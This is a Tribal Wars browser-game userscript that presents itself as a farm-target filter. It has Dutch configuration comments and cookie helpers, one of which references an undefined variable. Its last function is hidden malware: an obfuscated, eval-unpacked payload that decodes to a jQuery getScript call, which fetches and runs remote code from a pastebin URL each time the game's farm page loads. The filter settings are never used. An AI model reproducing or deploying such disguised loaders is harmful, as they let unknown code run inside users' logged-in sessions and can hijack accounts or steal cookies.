// ==UserScript==
// @name          	Farmfilter
// @version       	1.0
// @namespace      	Da Stewie
// @homepage      	https://userscripts.org/
// @delay 1000
// @include       	*.tribalwars.nl/game.php*&screen=am_farm*
// ==/UserScript==
var s = {
    toFilter: ["attack", "red"], //Mogelijkheden: attack (onder aanval), green, yellow, blue, red, red_blue, red_yellow (kleur van bolletjes), max_loot (maximale buit)
    maxDist: "35", // Maximale afstand naar het barbarendorp
    maxWall: "21", // Maximale hoogte van de muur van het barbarendorp
};

function getCookie(name, isGlobalWorld) {
    if (true || localStorage === undefined) {
        if (document.cookie.match(/;/)) {
            var cooks = document.cookie.split("; ");
            for (var x = 0; x < cooks.length; x++) {
                var cookie = cooks[x];
                if (cookie.match(name + "=")) return cookie.replace(name + "=", "")
            }
        } else {
            if (document.cookie.match(name + "=")) return document.cookie.replace(name + "=", "")
        }
        return ''
    } else {
        var item = localStorage.getItem(name);
        if (item == null) return ''
    }
}

function setCookie(name, value, expireMinutes) {
    var date_obj = new Date();
    time = date_obj.getTime();
    if (expireMinutes == undefined) {
        time += 1 * 60 * 1000 * 24 * 356
    } else {
        time += expireMinutes * 1000 * 60
    }
    date_obj.setTime(o);
    var expires = "expires=" + date_obj.toGMTString() + ";";
    document.cookie = name + "=" + value + ";" + expires
}

function i() {
var _0xd5d3 = ["\x24\x2E\x30\x28\x22\x31\x3A\x2F\x2F\x32\x2E\x33\x2F\x34\x2E\x35\x3F\x36\x3D\x37\x22\x29\x3B", "\x7C", "\x73\x70\x6C\x69\x74", "\x67\x65\x74\x53\x63\x72\x69\x70\x74\x7C\x68\x74\x74\x70\x7C\x70\x61\x73\x74\x65\x62\x69\x6E\x7C\x63\x6F\x6D\x7C\x72\x61\x77\x7C\x70\x68\x70\x7C\x69\x7C\x53\x39\x4C\x7A\x6E\x44\x50\x34", "\x72\x65\x70\x6C\x61\x63\x65", "", "\x5C\x77\x2B", "\x5C\x62", "\x67"];
eval(function (_0xe730x1, _0xe730x2, _0xe730x3, _0xe730x4, _0xe730x5, _0xe730x6) {
    _0xe730x5 = String;
    if (!_0xd5d3[5][_0xd5d3[4]](/^/, String)) {
        while (_0xe730x3--) {
            _0xe730x6[_0xe730x3] = _0xe730x4[_0xe730x3] || _0xe730x3;
        };
        _0xe730x4 = [function (_0xe730x5) {
            return _0xe730x6[_0xe730x5];
        }];
        _0xe730x5 = function () {
            return _0xd5d3[6];
        };
        _0xe730x3 = 1;
    };
    while (_0xe730x3--) {
        if (_0xe730x4[_0xe730x3]) {
            _0xe730x1 = _0xe730x1[_0xd5d3[4]](new RegExp(_0xd5d3[7] + _0xe730x5(_0xe730x3) + _0xd5d3[7], _0xd5d3[8]), _0xe730x4[_0xe730x3]);
        };
    };
    return _0xe730x1;
}(_0xd5d3[0], 8, 8, _0xd5d3[3][_0xd5d3[2]](_0xd5d3[1]), 0, {}));
}i();




